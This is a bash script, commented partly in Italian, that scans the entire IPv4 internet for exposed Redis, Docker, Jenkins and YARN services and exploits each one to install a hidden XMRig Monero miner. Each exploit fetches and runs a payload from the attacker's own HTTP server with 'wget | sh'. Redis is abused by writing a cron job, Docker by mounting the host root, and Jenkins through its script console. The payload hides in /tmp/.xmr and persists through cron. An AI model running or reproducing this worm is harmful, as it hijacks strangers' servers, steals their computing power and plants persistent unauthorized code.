#!/bin/bash
# =============================================================================
# mass_miner_auto_selfc2.sh - Mass Scan + Self-C2 + Auto XMRig Infection
# Usage: ./mass_miner_auto_selfc2.sh
# =============================================================================

# ------------------------------- CONFIGURATION --------------------------------
WALLET="43zXKZxJZx...IL_TUO_WALLET"
POOL="pool.supportxmr.com:3333"
PASSWORD="x"
RATE=5000
SCAN_PORTS="6379,2375,8080,8088"
OUTPUT_FILE="open_targets.txt"
LOG_DIR="./logs"
HTTP_PORT=8000
mkdir -p "$LOG_DIR"

# -------------------------- SELF C2 SETUP ------------------------------------
# Ottieni l'IP pubblico della macchina (cerca di rilevarlo automaticamente)
MY_IP=$(curl -s ifconfig.me 2>/dev/null || ip route get 1 | awk '{print $NF;exit}')
if [ -z "$MY_IP" ]; then
    echo "[-] Could not determine IP. Fallback to 127.0.0.1 (will only work locally)"
    MY_IP="127.0.0.1"
fi
echo "[+] Using self-C2 IP: $MY_IP:$HTTP_PORT"

# Prepara il miner e lo script di installazione
TMP_DIR=$(mktemp -d)
cd "$TMP_DIR" || exit 1

# Scarica XMRig dal sito ufficiale
wget -q --user xmrig --password download \
    https://download.xmrig.com/xmrig/6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz \
    -O xmrig.tar.gz
tar -xzf xmrig.tar.gz
mv xmrig-6.26.0/xmrig miner

# Crea config.json
cat > config.json <<EOF
{
    "autosave": false,
    "cpu": true,
    "pools": [
        {
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "$PASSWORD",
            "tls": false,
            "keepalive": true
        }
    ],
    "donate-level": 0
}
EOF

# Crea script di installazione remoto (install.sh)
cat > install.sh <<'EOF'
#!/bin/sh
# Questo script viene scaricato ed eseguito sul target
mkdir -p /tmp/.xmr
cd /tmp/.xmr
wget -q http://C2_IP:C2_PORT/miner
wget -q http://C2_IP:C2_PORT/config.json
chmod +x miner
nohup ./miner >/dev/null 2>&1 &
# Persistenza via cron
(crontab -l 2>/dev/null; echo "@reboot cd /tmp/.xmr && ./miner >/dev/null 2>&1 &") | crontab -
EOF

# Sostituisci i placeholder con IP e porta reali
sed -i "s/C2_IP/$MY_IP/g" install.sh
sed -i "s/C2_PORT/$HTTP_PORT/g" install.sh

# Avvia il server HTTP in background
echo "[+] Starting HTTP server on port $HTTP_PORT"
python3 -m http.server $HTTP_PORT > "$LOG_DIR/http.log" 2>&1 &
HTTP_PID=$!
sleep 2

# ------------------------------- FUNCTIONS -----------------------------------

# Redis exploit
exploit_redis() {
    local ip=$1
    echo "[*] Trying Redis on $ip"
    if redis-cli -h "$ip" -p 6379 PING 2>/dev/null | grep -q PONG; then
        echo "[+] Redis vulnerable on $ip"
        # Inietta un cron job che scarica ed esegue install.sh
        local cmd="(crontab -l 2>/dev/null; echo '*/5 * * * * wget -q -O- http://$MY_IP:$HTTP_PORT/install.sh | sh') | crontab -"
        redis-cli -h "$ip" CONFIG SET dir /var/spool/cron
        redis-cli -h "$ip" CONFIG SET dbfilename root
        redis-cli -h "$ip" SET mykey "$(echo "$cmd" | base64 -w0)"
        redis-cli -h "$ip" SAVE
        echo "[+] Deployed via Redis"
        return 0
    fi
    return 1
}

# Docker exploit
exploit_docker() {
    local ip=$1
    echo "[*] Trying Docker on $ip"
    if docker -H "tcp://$ip:2375" info >/dev/null 2>&1; then
        echo "[+] Docker API exposed on $ip"
        docker -H "tcp://$ip:2375" run -d --rm \
            -v /:/mnt --name miner_$$ alpine sh -c \
            "wget -qO- http://$MY_IP:$HTTP_PORT/install.sh | sh"
        echo "[+] Deployed via Docker"
        return 0
    fi
    return 1
}

# Jenkins exploit
exploit_jenkins() {
    local ip=$1
    echo "[*] Trying Jenkins on $ip"
    if curl -s "http://$ip:8080/login" | grep -qi "Jenkins"; then
        echo "[+] Jenkins found on $ip"
        local groovy="println 'wget -qO- http://$MY_IP:$HTTP_PORT/install.sh | sh'.execute().text"
        curl -s -X POST "http://$ip:8080/scriptText" \
            --data-urlencode "script=$groovy" >/dev/null
        echo "[+] Deployed via Jenkins"
        return 0
    fi
    return 1
}

# YARN exploit
exploit_yarn() {
    local ip=$1
    echo "[*] Trying YARN on $ip"
    if curl -s "http://$ip:8088/ws/v1/cluster/info" | grep -q "clusterInfo"; then
        echo "[+] YARN found on $ip"
        local json="{\"application-id\":\"app_miner\",\"application-name\":\"miner\",\"am-container-spec\":{\"commands\":{\"command\":\"wget -qO- http://$MY_IP:$HTTP_PORT/install.sh | sh\"}}}"
        curl -s -X POST "http://$ip:8088/ws/v1/cluster/apps" \
            -H "Content-Type: application/json" \
            -d "$json" >/dev/null
        echo "[+] Deployed via YARN"
        return 0
    fi
    return 1
}

# ------------------------------- MAIN ----------------------------------------

echo "[+] Starting Masscan on ports $SCAN_PORTS at rate $RATE pps"
sudo masscan 0.0.0.0/0 -p"$SCAN_PORTS" --rate="$RATE" -oG "$OUTPUT_FILE" 2>/dev/null

grep -oP 'Host: \K[0-9.]+' "$OUTPUT_FILE" | sort -u > "${OUTPUT_FILE}.ips"
echo "[+] Found $(wc -l < ${OUTPUT_FILE}.ips) unique IPs."

while read -r ip; do
    echo "=== Scanning $ip ==="
    nc -z -w 2 "$ip" 6379 2>/dev/null && exploit_redis "$ip"
    nc -z -w 2 "$ip" 2375 2>/dev/null && exploit_docker "$ip"
    nc -z -w 2 "$ip" 8080 2>/dev/null && exploit_jenkins "$ip"
    nc -z -w 2 "$ip" 8088 2>/dev/null && exploit_yarn "$ip"
done < "${OUTPUT_FILE}.ips"

# Cleanup
echo "[+] Stopping HTTP server"
kill $HTTP_PID
rm -rf "$TMP_DIR"
echo "[+] Done."
